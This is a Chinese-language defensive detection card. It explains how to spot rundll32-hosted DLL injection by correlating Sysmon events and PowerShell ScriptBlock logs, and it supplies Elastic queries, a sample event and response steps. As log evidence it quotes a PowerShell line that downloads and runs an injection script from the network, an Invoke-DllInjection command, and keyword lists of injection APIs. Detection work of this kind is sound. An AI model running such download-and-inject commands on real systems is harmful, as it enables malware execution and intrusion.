---
id: defense-detection-rundll32-injected-dll-sysmon-scriptblock
title: Sysmon + PowerShell ScriptBlock 检测 rundll32 承载的远程线程 DLL 注入：无参命令行、桌面工作目录与异常回连
type: scenario
domain: defense
path: defense/detection
technique: rundll32-injected-dll-detection-sysmon-scriptblock
tags:
- windows
- detection
- sysmon
- powershell
- scriptblock
- rundll32
- dll-injection
- process-injection
- incident-response
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V654
  verified_at: '2026-11-13T05:28:01+08:00'
  notes: 已对照原文与全部54图核对：Sysmon 22 raw.githubusercontent.com→185.199.108.133、事件3 powershell→443与rundll32→:88、事件1无参rundll32+Desktop+High、事件12/13 DisableAntiSpyware(rufus写HKU=0、svchost删/设HKLM=0)、4104 IEX与Invoke-DllInjection -ProcessID 3468、Process Hacker 172KB RWX与MZ、grok与agg查询均与截图一致；原文进程路径规则(not A or not B)恒真问题已在卡中修正为not (A or B)并注明。未验证点：检测查询未在SIEM实测；原文PID/IP前后不一(6256/5972、26.130/14.130)按代表性值引用；无受影响版本；frontmatter无sources/source_url。
url: /docs/defense/detection/defense-detection-rundll32-injected-dll-sysmon-scriptblock/
draft: false
kb_aliases:
- rundll32 注入检测
- DLL 注入 Sysmon 规则
- PowerShell 4104 注入脚本
- rundll32 无参数命令行
- DisableAntiSpyware 注册表篡改
- Meterpreter 回连检测
---

## 一句话结论

攻击者用 PowerShell（如 Invoke-DllInjection）把恶意 DLL 远程线程注入合法进程后，注入的 DLL stager 会派生 `rundll32.exe` 并回连 C2；把 Sysmon 事件 1/3/22/12/13 与 PowerShell ScriptBlock 4104 串成“脚本下载 → 无参数 rundll32 进程创建（桌面工作目录、异常父进程）→ 外连 → Defender 注册表篡改”的关联链，可以在合法签名的 rundll32 掩护下稳定检出注入行为。

## 原理

- **注入后的落地表现**：本例中 PowerShell 脚本 `Invoke-DllInjection -ProcessID 1480 -Dll evil.dll` 把 DLL 注入 rufus.exe；DLL stager 随后 `CreateProcessA("rundll32.exe")` 并对挂起线程写 shellcode 执行（见关联卡），于是出现 `rufus.exe → rundll32.exe → cmd.exe → conhost.exe` 的异常进程树。rundll32 的命令行只有 `rundll32.exe` 本身，没有正常的 `<dllname>,<entrypoint>` 参数，工作目录还是用户桌面——这三点合起来高度可疑。
- **内存特征**：rundll32 进程中出现 `Private: Commit` 的 RWX 区域（本例 172KB），内容以 `MZ`/`This program cannot be run in DOS mode` 开头，说明是写进内存后立即执行的 PE。
- **Sysmon 可见性**：事件 22 记录 `powershell.exe` 对 `raw.githubusercontent.com` 的 DNS 查询；事件 3 记录 `powershell.exe` 到 185.199.108.133:443（下载注入脚本）以及 `rundll32.exe` 到 C2 的 88 端口连接；事件 1 记录 rundll32 进程创建（父进程 rufus、当前目录 Desktop、IntegrityLevel High）；事件 12/13 记录 `DisableAntiSpyware` 的删除与重设。
- **PowerShell 4104 可见性**：即使注入脚本不落盘，ScriptBlock 日志仍会记录 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/.../Invoke-DllInjection-V2.ps1')` 和 `Invoke-DllInjection -ProcessID 3468 -Dll C:\Users\User\Desktop\evil.dll`，以及脚本正文（含 VirtualAllocEx/WriteProcessMemory/RtlCreateUserThread/LoadLibraryA 说明）。成对出现的 `$_.GlobalAssemblyCache`/`ToString('X2')` 等辅助条目可佐证程序集交互。
- **Defender 篡改（T1089）**：rufus.exe 写入 HKU 下 GPO 的 `DisableAntiSpyware=0`，随后 svchost.exe（SYSTEM）删除并重设 HKLM 同名值——用户 hive 写 + 系统 hive 删/设的组合本身异常；即使值为 0，键被操作即应告警。
- **为什么要关联**：单看 rundll32（系统签名、常见进程）、单看 PowerShell（管理脚本常用）都不够；把“脚本下载 → 注入命令 → 进程树 → 外联 → 注册表篡改”放在同一时间窗（分钟级）内，才能把误报压到可运营水平。

## 触发条件

- 终端部署 Sysmon（启用进程创建、网络连接、DNS 查询、注册表事件）与 PowerShell ScriptBlock 日志（4104）。
- 注入链经 PowerShell 脚本或至少经过会写日志的宿主执行；日志被采集到 SIEM/Elastic 等可关联查询的平台。
- 有正常的 rundll32 使用基线（路径、参数、调用方）用于排除误报。

## 利用步骤

1. **准备日志**：Sysmon 使用社区配置（如 Neo23x0 sysmon-config）；`HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging=1`，`wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:true`。
2. **DNS 先行**：筛事件 22 中 `powershell.exe` 对代码托管/CDN 域名（raw.githubusercontent.com、pastebin、对象存储）的查询，记录 QueryName/QueryResults。
3. **找异常 rundll32**：筛事件 1，条件为 `Image` 以 rundll32.exe 结尾且命令行不含 `.dll`；再看 `CurrentDirectory` 是否用户桌面/临时目录、父进程是否为 explorer/services 等常规调用方、完整性级别是否 High。
4. **看外联**：筛事件 3 中 `rundll32.exe` 的出站连接，关注高位端口（本例 88）与陌生外网 IP；与事件 22 的解析结果、注入脚本下载的 CDN 地址区分开。
5. **查注册表篡改**：筛事件 12/13 中 TargetObject 含 `Windows Defender\DisableAntiSpyware` 等策略键，确认操作进程是否为 svchost/rufus 等非预期进程。
6. **读 ScriptBlock**：从 4104 中搜 `DownloadString`、`IEX`、`Invoke-DllInjection`、`VirtualAllocEx`、`WriteProcessMemory`、`RtlCreateUserThread`、`Assembly.Load` 等关键词，还原脚本来源与注入参数。
7. **主机复核**：用 Process Hacker/EDR 查看 rundll32 的线程起始地址（rundll32+偏移 / ntdll!RtlUserThreadStart）、RWX 内存与 MZ/PE 内容，必要时 dump 内存进一步分析。
8. **串联时间线**：把 DNS、下载连接、进程创建、外联、注册表事件按时间排序，输出 IOC（域名、IP:端口、DLL 路径、父进程）并处置。

## PoC

检测查询（Kibana/Elastic 风格，字段名随采集管道可能是 `eventId`、`event.code` 或 `winlog.event_id`）：

```text
# 1) 无 DLL 参数的 rundll32 进程创建
eventId:1 and Image:"rundll32.exe" and not CommandLine:".dll"

# 2) 用 grok 从合法调用中提取 dllname/function，便于聚合与基线
.*rundll32\.exe\"?\s(?<dllname>.*?),(?<function>.*?)(<|\s)

# 3) 进程路径基线：只保留不在 System32/SysWOW64 的 rundll32
#    原文写法 (not Image:A or not Image:B) 会匹配所有记录，应改为 not (A or B)
eventId:1 and Image:"rundll32.exe" and not (Image:"C:\\Windows\\System32\\rundll32.exe" or Image:"C:\\Windows\\SysWOW64\\rundll32.exe")

# 4) rundll32 网络连接聚合
eventId:3 and Image:"rundll32.exe" agg:{"agg":{"term":"Image"}}
```

判读示例（Sysmon 事件 1）：

```text
Image           C:\Windows\System32\rundll32.exe
CommandLine     rundll32.exe
CurrentDirectory C:\Users\admin\Desktop\
ParentImage     C:\Users\admin\Desktop\rufus-4.2_x86.exe
IntegrityLevel  High
```

## 变体与关联

- **宿主变体**：regsvr32、mshta、dllhost、wscript、rundll32 等 LOLBin 承载注入 DLL 时，检测逻辑相同：命令行缺正常参数、路径/工作目录异常、父进程异常、随后外联。
- **无 rundll32 的注入**：反射 DLL、进程镂空、APC/线程劫持不一定派生 rundll32，需要转向 Sysmon 8/10（CreateRemoteThread/ProcessAccess）、事件 7（镜像加载）与内存扫描。
- **日志增强**：Sysmon 事件 7 记录 rundll32 加载非签名/非系统路径 DLL；事件 25（进程篡改）可补充；ETW callstack 可识别无支持模块的线程起始地址。
- 关联卡片：[[pentest-c2-classic-remote-thread-dll-injection]]（被检测的攻击链）、[[code-analysis-reverse-windows-msfvenom-reverse-tcp-dll-stager]]（rundll32 进程由 DLL stager 创建的机理）、[[defense-detection-unbacked-thread-start-address-injection-bypass]]（线程起始地址检测补充）。

## 检测与防御

- **检测规则运营**：先建 rundll32 正常基线（System32/SysWOW64 路径、`dllname,entrypoint` 参数、合法父进程），再对偏离项告警；对 `DisableAntiSpyware` 等 Defender 策略键的任何修改告警；对 rundll32 出站连接做白名单。
- **误报来源**：部分软件确实从安装目录调用 rundll32 加载自身 DLL（如打印驱动 `photowiz.dll`），需结合签名、路径与网络行为判断；PowerShell 管理脚本也会 4104，需按内容关键词过滤。
- **防御**：启用 ScriptBlock 日志与 AMSI、限制 PowerShell v2 降级；WDAC/AppLocker 限制 rundll32 的非常规调用；开启 Defender Tamper Protection 并监控策略键；EDR 监控跨进程写内存、远程线程与 RWX 内存。
- **响应**：确认注入后隔离主机、提取 rundll32 内存与 DLL 样本、封禁 C2 IP/域名，并排查同一账号/同一批脚本的其他主机。
